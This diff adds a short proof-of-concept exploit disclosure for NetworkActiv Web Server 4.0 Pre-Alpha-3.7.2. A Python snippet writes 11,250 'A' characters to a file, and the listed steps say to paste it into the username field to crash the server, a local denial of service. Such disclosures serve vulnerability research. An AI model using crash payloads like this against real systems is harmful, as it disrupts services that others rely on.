@@ -1,0 +1,22 @@
+#Exploit Title: NetworkActiv Web Server 4.0 Pre-Alpha-3.7.2 - 'Username' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2018-08-30
+#Vendor Homepage: https://www.networkactiv.com/WebServer.html
+#Software Link: https://www.networkactiv.com/Dev/
+#Tested Version: 4.0 Pre-Alpha-3.7.2
+#Tested on: Windows 10 Single Language x64
+
+#Steps to produce the crash:
+#1.- Run python code: NetworkActiv_Web_Server_4.0_PA_3.7.2.py
+#2.- Open Network.txt and copy content to clipboard
+#2.- Open NetworkActiv Web Server 4.0 
+#3.- Select Security options 
+#4.- Select "Set username" and Paste ClipBoard on "New Value" 
+#6.- Select "Set password" and Put "1234" on "New Value" 
+#7.- Crashed
+
+cod = "\x41" * 11250
+
+f = open('Network.txt', 'w')
+f.write(cod)
+f.close()
